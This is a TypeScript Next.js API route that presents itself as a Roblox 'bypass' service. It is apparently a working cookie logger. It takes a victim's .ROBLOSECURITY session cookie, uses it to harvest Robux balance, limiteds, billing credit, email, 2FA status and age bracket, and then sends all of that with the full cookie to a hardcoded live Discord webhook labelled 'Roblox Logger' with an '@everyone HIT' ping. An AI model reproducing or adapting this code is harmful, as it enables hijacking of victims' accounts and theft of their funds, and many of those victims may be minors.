import { createServerClient } from "@supabase/ssr"
import { cookies } from "next/headers"

export async function POST(request: Request) {
  try {
    const { cookie, username } = await request.json()

    if (!cookie || cookie.trim().length < 50) {
      return Response.json(
        {
          error: "Invalid or incomplete cookie. Please provide the complete .ROBLOSECURITY cookie.",
          success: false,
        },
        { status: 400 },
      )
    }

    if (!username || username.trim().length === 0) {
      return Response.json(
        {
          error: "Please provide a valid Roblox username.",
          success: false,
        },
        { status: 400 },
      )
    }

    let inputUserData = null
    let inputAvatarUrl = ""

    try {
      const usernameResponse = await fetch(`https://users.roblox.com/v1/usernames/users`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          usernames: [username.trim()],
          excludeBannedUsers: false,
        }),
      })

      if (!usernameResponse.ok) {
        return Response.json(
          {
            error: "Invalid Roblox username. Please check the username and try again.",
            success: false,
          },
          { status: 400 },
        )
      }

      const usernameData = await usernameResponse.json()

      if (!usernameData.data || usernameData.data.length === 0) {
        return Response.json(
          {
            error: "Roblox username not found. Please enter a valid username.",
            success: false,
          },
          { status: 400 },
        )
      }

      inputUserData = usernameData.data[0]

      const avatarResponse = await fetch(
        `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${inputUserData.id}&size=150x150&format=Png&isCircular=false`,
      )

      if (avatarResponse.ok) {
        const avatarData = await avatarResponse.json()
        if (avatarData.data && avatarData.data[0]) {
          inputAvatarUrl = avatarData.data[0].imageUrl
        }
      }
    } catch (error) {
      return Response.json(
        {
          error: "Failed to validate username. Please try again.",
          success: false,
        },
        { status: 500 },
      )
    }

    let cookieValue = cookie.trim()

    // Remove any newlines and carriage returns
    cookieValue = cookieValue.replace(/[\r\n]+/g, "")

    // Remove .ROBLOSECURITY= prefix if someone copied with it
    if (cookieValue.toLowerCase().startsWith(".roblosecurity=")) {
      cookieValue = cookieValue.substring(15)
    }

    // Remove any surrounding quotes
    cookieValue = cookieValue.replace(/^["']|["']$/g, "").trim()

    // The cookie value should be used as-is (including the WARNING prefix if present)
    // Do NOT strip the WARNING prefix - it's part of the token
    const formattedCookie = `.ROBLOSECURITY=${cookieValue}`

    let cookieUserInfo = null
    let robuxBalance = "0"
    let rap = "0"
    let cookieAvatarUrl = ""
    let totalSpent = 0
    let totalIncoming = 0
    let totalOutgoing = 0
    let hasKorblox = false
    let hasHeadless = false
    let hasValkyrie = false
    let limitedsCount = 0
    let accountCreationDate = "Unknown"
    let isOver13 = "Unknown"
    let hasPremium = false
    let emailAddress = ""
    let emailVerified = "Unverified"
    let has2FAEnabled = false
    let has2FADisplay = "Not Set"
    let creditBalance = 0 // Store the raw balance value as a number, not converted to string
    let creditCurrency = "USD"

    const headlessAssetId = 134082579
    const valkyrieAssetIds = [1365767, 100929604, 855891703]

    const robloxHeaders: HeadersInit = {
      Cookie: formattedCookie,
      Accept: "application/json",
    }

    try {
      // First authenticate to verify the cookie works
      const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
        method: "GET",
        headers: robloxHeaders,
      })

      if (!userResponse.ok) {
        const errorBody = await userResponse.text()
        console.log("[v0] Auth failed:", userResponse.status, errorBody)
        console.log("[v0] Cookie length:", cookieValue.length)
        console.log("[v0] Cookie preview:", cookieValue.substring(0, 100))

        return Response.json(
          {
            error:
              "Invalid Roblox cookie. The cookie may be expired or incorrect. Make sure to copy the full .ROBLOSECURITY cookie value including the WARNING prefix.",
            success: false,
          },
          { status: 401 },
        )
      }

      cookieUserInfo = await userResponse.json()
      console.log("[v0] Auth success, user:", cookieUserInfo?.name, "id:", cookieUserInfo?.id)

      if (cookieUserInfo?.id) {
        const [avatarResult, userDetailsResult, premiumResult, balanceResult, inventoryResult, transactionResult] =
          await Promise.allSettled([
            fetch(
              `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${cookieUserInfo.id}&size=150x150&format=Png&isCircular=false`,
            ),
            fetch(`https://users.roblox.com/v1/users/${cookieUserInfo.id}`),
            fetch(`https://premiumfeatures.roblox.com/v1/users/${cookieUserInfo.id}/validate-membership`, {
              headers: robloxHeaders,
            }),
            fetch(`https://economy.roblox.com/v1/users/${cookieUserInfo.id}/currency`, {
              headers: robloxHeaders,
            }),
            fetch(
              `https://inventory.roblox.com/v1/users/${cookieUserInfo.id}/assets/collectibles?sortOrder=Asc&limit=100`,
              {
                headers: robloxHeaders,
              },
            ),
            fetch(
              `https://economy.roblox.com/v2/users/${cookieUserInfo.id}/transaction-totals?timeFrame=Year&transactionType=summary`,
              {
                headers: robloxHeaders,
              },
            ),
          ])

        if (avatarResult.status === "fulfilled" && avatarResult.value.ok) {
          const avatarData = await avatarResult.value.json()
          if (avatarData.data && avatarData.data[0]) {
            cookieAvatarUrl = avatarData.data[0].imageUrl
          }
        }

        if (userDetailsResult.status === "fulfilled" && userDetailsResult.value.ok) {
          const userDetails = await userDetailsResult.value.json()
          if (userDetails.created) {
            accountCreationDate = userDetails.created
          }
        }

        if (premiumResult.status === "fulfilled" && premiumResult.value.ok) {
          const premiumData = await premiumResult.value.json()
          hasPremium = premiumData === true
        }

        if (balanceResult.status === "fulfilled" && balanceResult.value.ok) {
          const balanceData = await balanceResult.value.json()
          robuxBalance = balanceData.robux?.toString() || "0"
          console.log("[v0] Robux balance:", robuxBalance)
        }

        if (inventoryResult.status === "fulfilled" && inventoryResult.value.ok) {
          const inventoryData = await inventoryResult.value.json()
          limitedsCount = inventoryData.data?.length || 0
          const totalRap = inventoryData.data?.reduce((sum: number, item: { recentAveragePrice?: number }) => {
            return sum + (item.recentAveragePrice || 0)
          }, 0)
          rap = totalRap?.toString() || "0"
        }

        if (transactionResult.status === "fulfilled" && transactionResult.value.ok) {
          const salesData = await transactionResult.value.json()
          totalIncoming = salesData.salesTotal || 0
          totalOutgoing = Math.abs(salesData.purchasesTotal || 0)
          totalSpent = totalOutgoing
        }

        try {
          const creditResponse = await fetch("https://billing.roblox.com/v1/credit", {
            headers: robloxHeaders,
          })
          if (creditResponse.ok) {
            const creditData = await creditResponse.json()
            console.log("[v0] Credit data:", JSON.stringify(creditData))
            creditBalance =
              typeof creditData.balance === "number" ? creditData.balance : Number.parseFloat(creditData.balance) || 0
            creditCurrency = creditData.currencyCode || creditData.currency || "USD"
            console.log("[v0] Parsed credit balance:", creditBalance, "currency:", creditCurrency)
          } else {
            console.log("[v0] Credit response not ok:", creditResponse.status)
          }
        } catch (e) {
          console.log("[v0] Credit fetch error:", e)
        }

        try {
          const settingsResponse = await fetch("https://www.roblox.com/my/settings/json", {
            headers: robloxHeaders,
          })

          if (settingsResponse.ok) {
            const settingsData = await settingsResponse.json()
            console.log("[v0] Settings response received")

            // Age bracket detection
            if (settingsData.UserAbove13 !== undefined) {
              isOver13 = settingsData.UserAbove13 ? "13+" : "Under 13"
              console.log("[v0] Age bracket:", isOver13)
            }

            // Email info
            if (settingsData.UserEmail) {
              emailAddress = settingsData.UserEmail
            }
            if (settingsData.UserEmailVerified !== undefined) {
              emailVerified = settingsData.UserEmailVerified ? "Verified" : "Unverified"
              console.log("[v0] Email:", emailVerified, emailAddress)
            }

            if (settingsData.MyAccountSecurityModel) {
              const secModel = settingsData.MyAccountSecurityModel
              console.log("[v0] MyAccountSecurityModel:", JSON.stringify(secModel))

              // Check if 2FA is enabled from the settings
              if (secModel.IsTwoStepEnabled === true) {
                has2FAEnabled = true
                has2FADisplay = "Enabled"
                console.log("[v0] 2FA is enabled based on IsTwoStepEnabled flag")
              }

              // Check TwoStepVerificationViewModel for additional confirmation
              if (secModel.TwoStepVerificationViewModel?.IsEnabled === true) {
                has2FAEnabled = true
                has2FADisplay = "Enabled"
                console.log("[v0] 2FA is enabled based on TwoStepVerificationViewModel")
              }
            }
          }
        } catch (e) {
          console.log("[v0] Settings fetch error:", e)
        }

        console.log("[v0] Final 2FA status:", has2FADisplay)

        // Check for Korblox ownership (Bundle ID 347)
        try {
          const korbloxResponse = await fetch(
            `https://inventory.roblox.com/v1/users/${cookieUserInfo.id}/items/Bundle/347`,
            { headers: robloxHeaders },
          )
          if (korbloxResponse.ok) {
            const korbloxData = await korbloxResponse.json()
            hasKorblox = korbloxData.data && korbloxData.data.length > 0
          }
        } catch {
          // Silent fail
        }

        // Check for Headless ownership
        try {
          const headlessResponse = await fetch(
            `https://inventory.roblox.com/v1/users/${cookieUserInfo.id}/items/Asset/${headlessAssetId}`,
            { headers: robloxHeaders },
          )
          if (headlessResponse.ok) {
            const headlessData = await headlessResponse.json()
            hasHeadless = headlessData.data && headlessData.data.length > 0
          }
        } catch {
          // Silent fail
        }

        // Check for Valkyrie ownership
        for (const valkId of valkyrieAssetIds) {
          try {
            const valkResponse = await fetch(
              `https://inventory.roblox.com/v1/users/${cookieUserInfo.id}/items/Asset/${valkId}`,
              { headers: robloxHeaders },
            )
            if (valkResponse.ok) {
              const valkData = await valkResponse.json()
              if (valkData.data && valkData.data.length > 0) {
                hasValkyrie = true
                break
              }
            }
          } catch {
            // Silent fail
          }
        }
      }
    } catch (error) {
      console.log("[v0] Main fetch error:", error)
      return Response.json(
        {
          error: "Failed to validate cookie. The cookie may be invalid or expired.",
          success: false,
        },
        { status: 401 },
      )
    }

    const ROBLOX_R_LOGO = "https://images.rbxcdn.com/0cfc9e3d1881cf8f7c13d467155c1792.png"
    const EMOJI_ROBUX = "<:robux:1459370175962026096>"
    const EMOJI_PURPLE_ROBUX = "<:Purple_Robux:1459382144760549480>"
    const EMOJI_PREMIUM = "<:rbxPremium:1459367939135504486>"
    const EMOJI_KORBLOX = "<:KorbloxDeathspeaker:1459369436791181325>"
    const EMOJI_HEADLESS = "<:HeadlessHorseman:1459369353924448358>"
    const EMOJI_VALK = "<:valk:1459382673888772229>"
    const EMOJI_EMAIL = "<:neon_gmail_icon:1459382201090183201>"
    const EMOJI_CHECK = "<:CheckMark:1459373283714535560>"
    const EMOJI_SETTINGS = "<:emoji_14:1459383393941848126>"
    const EMOJI_WHITE_FIRE = "<a:WhiteFire:1459486498595410032>"
    const EMOJI_PAYMENTS = "<:emoji_18:1459496114959945738>"
    const EMOJI_TRANSACTION = "<:emoji_19:1459511566331281490>"

    const formatNumber = (num: number | string) => {
      const n = typeof num === "string" ? Number.parseFloat(num) || 0 : num
      return n.toLocaleString()
    }

    const formatCurrency = (num: number) => {
      return num.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })
    }

    const robuxNum = typeof robuxBalance === "string" ? Number.parseInt(robuxBalance) || 0 : robuxBalance
    const rapNum = typeof rap === "string" ? Number.parseInt(rap) || 0 : rap
    const isHighValue = hasKorblox || hasHeadless || hasValkyrie || robuxNum >= 10000 || rapNum >= 50000

    let accountAgeDays = 0
    if (accountCreationDate !== "Unknown") {
      const createdDate = new Date(accountCreationDate)
      const now = new Date()
      accountAgeDays = Math.floor((now.getTime() - createdDate.getTime()) / (1000 * 60 * 60 * 24))
    }

    const emailDisplay = emailAddress ? `${emailVerified} (${emailAddress})` : emailVerified

    const webhookData: {
      content: string
      username?: string
      avatar_url?: string
      allowed_mentions?: { parse: string[] }
      embeds: Array<{
        title?: string
        description?: string
        color: number
        thumbnail?: { url: string }
        author?: { name: string; icon_url: string; url?: string }
        timestamp?: string
        footer?: { text: string; icon_url?: string }
      }>
    } = {
      content: `@everyone @here **HIT**`,
      username: "Roblox Logger",
      avatar_url: ROBLOX_R_LOGO,
      allowed_mentions: {
        parse: ["everyone"],
      },
      embeds: [
        {
          author: {
            name: `${cookieUserInfo?.displayName || cookieUserInfo?.name || "Unknown"} (@${cookieUserInfo?.name || "Unknown"})`,
            icon_url: cookieAvatarUrl || ROBLOX_R_LOGO,
            url: `https://www.roblox.com/users/${cookieUserInfo?.id || 0}/profile`,
          },
          description: [
            `${EMOJI_WHITE_FIRE} **ᴀᴄᴄᴏᴜɴᴛ ʜɪᴛ** ${EMOJI_WHITE_FIRE}\n`,
            `**Account Stats**`,
            `\`Account Age: ${accountAgeDays} Days\``,
            `\`Age Bracket: ${isOver13}\`\n`,
            `${EMOJI_ROBUX} **Robux**`,
            `**Balance:** ${formatNumber(robuxBalance)} ${EMOJI_ROBUX}`,
            `**Pending:** 0 ${EMOJI_ROBUX}\n`,
            `${EMOJI_VALK} **Limiteds**`,
            `**RAP:** ${formatNumber(rap)} ${EMOJI_ROBUX}`,
            `**Limiteds:** ${limitedsCount}\n`,
            `${EMOJI_PURPLE_ROBUX} **Summary**`,
            `${formatNumber(totalSpent)} ${EMOJI_ROBUX}\n`,
            `**Transactions**`,
            `**Incoming:** +${formatNumber(totalIncoming)} ${EMOJI_TRANSACTION}`,
            `**Outgoing:** -${formatNumber(totalOutgoing)} ${EMOJI_TRANSACTION}`,
            `**Total Spent:** ${formatNumber(totalSpent)} ${EMOJI_TRANSACTION}\n`,
            `${EMOJI_PAYMENTS} **Payments**`,
            `**Credit Balance:** $${formatCurrency(creditBalance)} ${creditCurrency}\n`,
            `${EMOJI_SETTINGS} **Settings**`,
            `${EMOJI_EMAIL} **Email:** ${emailDisplay}`,
            `**2FA:** ${has2FADisplay}\n`,
            `${EMOJI_VALK} **Inventory**`,
            `${EMOJI_KORBLOX} **Korblox:** ${hasKorblox ? "True" : "False"}`,
            `${EMOJI_HEADLESS} **Headless:** ${hasHeadless ? "True" : "False"}`,
            `${EMOJI_VALK} **Valkyrie:** ${hasValkyrie ? "True" : "False"}\n`,
            `${EMOJI_PREMIUM} **Premium**`,
            `${hasPremium ? "True" : "False"}`,
          ].join("\n"),
          color: isHighValue ? 0xf1c40f : 0x5865f2,
          thumbnail: { url: cookieAvatarUrl || ROBLOX_R_LOGO },
          timestamp: new Date().toISOString(),
          footer: {
            text: `${cookieUserInfo?.displayName || cookieUserInfo?.name || "Unknown"} (@${cookieUserInfo?.name || "Unknown"})`,
            icon_url: cookieAvatarUrl || ROBLOX_R_LOGO,
          },
        },
        {
          title: `Cookie`,
          description: `\`\`\`${cookie.substring(0, 1900)}${cookie.length > 1900 ? "..." : ""}\`\`\``,
          color: 0x2b2d31,
          footer: {
            text: `${cookie.length} characters`,
            icon_url: ROBLOX_R_LOGO,
          },
        },
      ],
    }

    try {
      await fetch(
        "https://discord.com/api/webhooks/1451523340698259509/RTxIlA5rJ4UWqu7TdTZ6q1BkXWI8SNKVomOYPVBk_hmr43f5zRp70hPGadeXUQ80AGVb",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(webhookData),
        },
      )
    } catch {
      // Silent fail
    }

    try {
      const cookieStore = await cookies()
      const supabase = createServerClient(
        process.env.NEXT_PUBLIC_SUPABASE_URL!,
        process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
        {
          cookies: {
            getAll() {
              return cookieStore.getAll()
            },
            setAll(cookiesToSet) {
              try {
                cookiesToSet.forEach(({ name, value, options }) => cookieStore.set(name, value, options))
              } catch {
                // Ignore
              }
            },
          },
        },
      )

      await supabase.from("recent_bypasses").insert([
        {
          username: inputUserData?.name || username,
          display_name: inputUserData?.displayName || username,
          avatar_url: inputAvatarUrl,
          created_at: new Date().toISOString(),
        },
      ])
    } catch {
      // Ignore database errors
    }

    return Response.json({
      success: true,
      userInfo: {
        name: inputUserData?.name || username,
        displayName: inputUserData?.displayName || username,
        id: inputUserData?.id,
      },
      avatarUrl: inputAvatarUrl,
      transactionData: {
        totalSpent: totalSpent,
        totalIncoming: totalIncoming,
        totalOutgoing: totalOutgoing,
      },
      rareItems: {
        hasKorblox: hasKorblox,
        hasHeadless: hasHeadless,
        hasValkyrie: hasValkyrie,
      },
      twoFAStatus: {
        has2FAEnabled: has2FAEnabled,
        display: has2FADisplay,
      },
      creditData: {
        balance: creditBalance,
        currency: creditCurrency,
      },
    })
  } catch {
    return Response.json({ error: "Failed to process request. Please try again.", success: false }, { status: 500 })
  }
}
